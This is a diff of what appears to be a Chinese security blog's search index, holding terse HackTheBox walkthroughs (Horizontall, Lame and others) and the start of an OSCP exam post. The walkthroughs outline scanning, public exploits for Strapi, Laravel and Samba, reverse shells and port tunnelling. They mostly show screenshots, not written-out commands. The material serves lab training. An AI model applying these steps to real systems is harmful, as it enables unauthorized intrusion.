-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.5swzqjd0kaw0.webp"
-                     
-                ></p>
-<p>看看js文件</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.1my7lwoj1ohs.webp"
-                     
-                ></p>
-<p>又发现一个域名，添加hosts文件</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.428laop0fi40.webp"
-                     
-                ></p>
-<p>扫目录</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.20sc9lu7ygo0.webp"
-                     
-                ></p>
-<p>看看admin</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.1buckc8a6fz4.webp"
-                     
-                ></p>
-<p>登录框，而且给了提示是strapi，搜一下有无exp</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.7ozup67o0t0.webp"
-                     
-                ></p>
-<p>尝试最后一个重置密码</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.6d1orcl8vwg0.webp"
-                     
-                ></p>
-<p><code>https://github.com/guglia001/CVE-2019-18818/blob/main/CVE-2019-18818.py</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.4878r2ft47w0.webp"
-                     
-                ></p>
-<p>email盲猜是admin@加上域名</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.1vaq1n4g09uo.webp"
-                     
-                ></p>
-<p>成功重置密码</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.1anbj1y08qe8.webp"
-                     
-                ></p>
-<p>登录后在尝试rce漏洞</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.772bvyjzv5g0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.3gg13e0x2tk0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.47klgx0xd520.webp"
-                     
-                ></p>
-<p>试试反弹shell</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.26ng41v7kq80.webp"
-                     
-                ></p>
-<p>用base64编码</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.795r4pz4j480.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.4auy7csm5yg0.webp"
-                     
-                ></p>
-<p>提权</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.3ctrg7xhk880.webp"
-                     
-                ></p>
-<p>发现数据库账号密码</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.51jd8y71zyc0.webp"
-                     
-                ></p>
-<p>就一个admin，而且密码还是被重置为123456的</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.5qp8iyqce3g0.webp"
-                     
-                ></p>
-<p>这个1337和8000端口不知道是什么服务</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.50p8khlouyc0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.29iqi9c7t6tc.webp"
-                     
-                ></p>
-<p>8000端口发现一个Laravel 服务</p>
-<p><code>https://github.com/nth347/CVE-2021-3129_exploit</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.1qkrvwl40peo.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.57hiza99nag0.webp"
-                     
-                ></p>
-<p>正好这边有个exp可利用，但是他端口只要本地开放，要把端口转发过来</p>
-<p>用chisel把端口转发到攻击机</p>
-<p><code>https://github.com/jpillora/chisel</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.6ykay3nxp9s0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.72hsoqj3aqk0.webp"
-                     
-                ></p>
-<p>访问127.0.0.1:8000</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.3ccxb0rwgrs0.webp"
-                     
-                ></p>
-<p>尝试用Laravel的exp</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.54a4l4l33380.webp"
-                     
-                ></p>
-<p>反弹shell</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.9ti35w88r44.webp"
-                     
-                ></p>
-<p>还是用base64</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.5nuqhmr2n2w0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.6btdn54nh400.webp"
-                     
-                ></p>
-]]></content>
-      <tags>
-        <tag>Hack-The-Box</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hawk - HackTheBox</title>
     <url>/post/4ed2fd6214e3/</url>
     <content><![CDATA[<p><img  
@@ -6449,6 +6203,252 @@
                      lazyload
                      alt="image"
                      data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.39khphhoncw0.webp"
+                     
+                ></p>
+]]></content>
+      <tags>
+        <tag>Hack-The-Box</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Horizontall - HackTheBox</title>
+    <url>/post/e6803fd388f9/</url>
+    <content><![CDATA[<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.1mwfsxtmi09s.webp"
+                     
+                ></p>
+<p>nmap扫描</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.69kxmaxykt80.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.5rqgfarbnkk0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.2in7n1rq3s40.webp"
+                     
+                ></p>
+<p>添加域名到hosts文件，访问80端口</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.38ozehra6di0.webp"
+                     
+                ></p>
+<p>扫目录</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.5swzqjd0kaw0.webp"
+                     
+                ></p>
+<p>看看js文件</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.1my7lwoj1ohs.webp"
+                     
+                ></p>
+<p>又发现一个域名，添加hosts文件</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.428laop0fi40.webp"
+                     
+                ></p>
+<p>扫目录</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.20sc9lu7ygo0.webp"
+                     
+                ></p>
+<p>看看admin</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.1buckc8a6fz4.webp"
+                     
+                ></p>
+<p>登录框，而且给了提示是strapi，搜一下有无exp</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.7ozup67o0t0.webp"
+                     
+                ></p>
+<p>尝试最后一个重置密码</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.6d1orcl8vwg0.webp"
+                     
+                ></p>
+<p><code>https://github.com/guglia001/CVE-2019-18818/blob/main/CVE-2019-18818.py</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.4878r2ft47w0.webp"
+                     
+                ></p>
+<p>email盲猜是admin@加上域名</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.1vaq1n4g09uo.webp"
+                     
+                ></p>
+<p>成功重置密码</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.1anbj1y08qe8.webp"
+                     
+                ></p>
+<p>登录后在尝试rce漏洞</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.772bvyjzv5g0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.3gg13e0x2tk0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.47klgx0xd520.webp"
+                     
+                ></p>
+<p>试试反弹shell</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.26ng41v7kq80.webp"
+                     
+                ></p>
+<p>用base64编码</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.795r4pz4j480.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.4auy7csm5yg0.webp"
+                     
+                ></p>
+<p>提权</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.3ctrg7xhk880.webp"
+                     
+                ></p>
+<p>发现数据库账号密码</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.51jd8y71zyc0.webp"
+                     
+                ></p>
+<p>就一个admin，而且密码还是被重置为123456的</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.5qp8iyqce3g0.webp"
+                     
+                ></p>
+<p>这个1337和8000端口不知道是什么服务</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.50p8khlouyc0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.29iqi9c7t6tc.webp"
+                     
+                ></p>
+<p>8000端口发现一个Laravel 服务</p>
+<p><code>https://github.com/nth347/CVE-2021-3129_exploit</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.1qkrvwl40peo.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.57hiza99nag0.webp"
+                     
+                ></p>
+<p>正好这边有个exp可利用，但是他端口只要本地开放，要把端口转发过来</p>
+<p>用chisel把端口转发到攻击机</p>
+<p><code>https://github.com/jpillora/chisel</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.6ykay3nxp9s0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.72hsoqj3aqk0.webp"
+                     
+                ></p>
+<p>访问127.0.0.1:8000</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.3ccxb0rwgrs0.webp"
+                     
+                ></p>
+<p>尝试用Laravel的exp</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.54a4l4l33380.webp"
+                     
+                ></p>
+<p>反弹shell</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.9ti35w88r44.webp"
+                     
+                ></p>
+<p>还是用base64</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.5nuqhmr2n2w0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.6btdn54nh400.webp"
                      
                 ></p>
 ]]></content>
@@ -7387,144 +7387,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Lame - HackTheBox</title>
-    <url>/post/742af00ba586/</url>
-    <content><![CDATA[<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.3cctretsz8c0.webp"
-                     
-                ></p>
-<p>nmap扫描</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.4c514j3qieg0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.2zc1farqs7m0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.3bbsyao9c3e0.webp"
-                     
-                ></p>
-<p>21端口开放的vsftp 2.3.4貌似有后门，搜一下exp</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.3h4cmwclxy00.webp"
-                     
-                ></p>
-<p>但没有用</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.47o1j8sn0c80.webp"
-                     
-                ></p>
-<p>尝试445端口</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.3apuhete8ia0.webp"
-                     
-                ></p>
-<p>搜索有无可用exp</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.3yxqu78czne0.webp"
-                     
-                ></p>
-<p>选用16320.rb</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.svehw3mpbmo.webp"
-                     
-                ></p>
-<p>将文件复制到根目录</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.4zax83zziwo0.webp"
-                     
-                ></p>
-<p>由于.rb文件无法直接执行，查看文件内容，看能否找到CVE编号</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.620kyucp0to0.webp"
-                     
-                ></p>
-<p>google搜索CVE编号，查找exp</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.8p17py7nxwg.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.45b9jleemto0.webp"
-                     
-                ></p>
-<p>将exp下载到本地运行</p>
-<p>这里报错缺少python库</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.51wgozr0stc0.webp"
-                     
-                ></p>
-<p>根据文档安装一下</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.16laqdzhw468.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.2tupu5v49us0.webp"
-                     
-                ></p>
-<p>尝试利用</p>
-<p>运行时跟上目标IP地址，端口，以及需要反弹的IP地址和端口</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.3223y7lr8900.webp"
-                     
-                ></p>
-<p>nc监听反弹端口</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.2sj5quhv6j00.webp"
-                     
-                ></p>
-<p>直接就root权限了</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.3z3jz5hnr440.webp"
-                     
-                ></p>
-]]></content>
-      <tags>
-        <tag>Hack-The-Box</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Kotarak - HackTheBox</title>
     <url>/post/9cd54bd1c82b/</url>
     <content><![CDATA[<p><img  
@@ -7751,6 +7613,144 @@
                      lazyload
                      alt="image"
                      data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Kotarak/image.63hr3w560s40.webp"
+                     
+                ></p>
+]]></content>
+      <tags>
+        <tag>Hack-The-Box</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Lame - HackTheBox</title>
+    <url>/post/742af00ba586/</url>
+    <content><![CDATA[<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.3cctretsz8c0.webp"
+                     
+                ></p>
+<p>nmap扫描</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.4c514j3qieg0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.2zc1farqs7m0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.3bbsyao9c3e0.webp"
+                     
+                ></p>
+<p>21端口开放的vsftp 2.3.4貌似有后门，搜一下exp</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.3h4cmwclxy00.webp"
+                     
+                ></p>
+<p>但没有用</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.47o1j8sn0c80.webp"
+                     
+                ></p>
+<p>尝试445端口</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.3apuhete8ia0.webp"
+                     
+                ></p>
+<p>搜索有无可用exp</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.3yxqu78czne0.webp"
+                     
+                ></p>
+<p>选用16320.rb</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.svehw3mpbmo.webp"
+                     
+                ></p>
+<p>将文件复制到根目录</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.4zax83zziwo0.webp"
+                     
+                ></p>
+<p>由于.rb文件无法直接执行，查看文件内容，看能否找到CVE编号</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.620kyucp0to0.webp"
+                     
+                ></p>
+<p>google搜索CVE编号，查找exp</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.8p17py7nxwg.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.45b9jleemto0.webp"
+                     
+                ></p>
+<p>将exp下载到本地运行</p>
+<p>这里报错缺少python库</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.51wgozr0stc0.webp"
+                     
+                ></p>
+<p>根据文档安装一下</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.16laqdzhw468.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.2tupu5v49us0.webp"
+                     
+                ></p>
+<p>尝试利用</p>
+<p>运行时跟上目标IP地址，端口，以及需要反弹的IP地址和端口</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.3223y7lr8900.webp"
+                     
+                ></p>
+<p>nc监听反弹端口</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.2sj5quhv6j00.webp"
+                     
+                ></p>
+<p>直接就root权限了</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lame/image.3z3jz5hnr440.webp"
                      
                 ></p>
 ]]></content>
@@ -10111,6 +10111,115 @@
       </tags>
   </entry>
   <entry>
+    <title>OSCP</title>
+    <url>/post/86d0e942ee7c/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>OSCP（Offensive Security Certified Professional）是由OffSec（也就是kali的设计以及维护官方）推出的一个渗透认证考试，要求持有者在安全的实验室环境中成功攻击和渗透各种实时机器，不设立笔试环节。</p>
+<h1 id="课程内容与变化"><a href="#课程内容与变化" class="headerlink" title="课程内容与变化"></a>课程内容与变化</h1><p>OffSec官方今年3月份的时候宣布更新了PEN-200的课程和考试内容（又名PEN-200-2023，后面又改回去了），这也意味着难度可能更高。</p>
+<p>主要的变化有：</p>
+<ul>
+<li>移出了前置的基础内容，包括：熟悉Kali Linux、命令行使用等</li>
+<li>移出了缓冲区溢出内容</li>
+<li>扩充了SQL注入部分</li>
+<li>扩充了提权部分</li>
+<li>扩充了端口转发和隧道部分</li>
+<li>扩充了Active Directory部分</li>
+</ul>
+<p>这次的更新变化还是挺大的，以前如果在考试的时候遇见缓冲区溢出的题目，那么这将是送分题，而且每个缓冲区溢出的题目分值都不低，大多在15-20分，<del>这也意味着没法混</del>，而扩展的SQL注入、提权、以及AD域的内容则更贴切当前的行业需求吧，毕竟现在都这么卷，要是不会个内网提权啥的，都没人看你一眼。</p>
+<p>而之前获得奖励积分的条件也改变了：</p>
+<ul>
+<li>获得30台主机的<code>proof.txt</code></li>
+<li>完成每个模块中80%的练习</li>
+</ul>
+<p>proof.txt也就是靶场练习中的root权限flag，而模块练习则是需要每一个模块中的练习题，都完成至总进度的百分之八十，少一个都不行，但是模块练习中的一些题目则很让人难受，我记得有一题填空题，我只是忘记将它的开头字母大写而已，死活就是验证不正确。</p>
+<p>总的来说，练习不难，但恶心，如果对自己有信心，就可以不用考虑去拿这10分的奖励积分。</p>
+<p>新<code>labs</code>面板如下图所示</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.statically.io/gh/Tddddddddd/picx-images-hosting@master/image/image.45u9o77hqaq0.webp"
+                     
+                ></p>
+<p>这是在OffSec官方的discord频道中找到的</p>
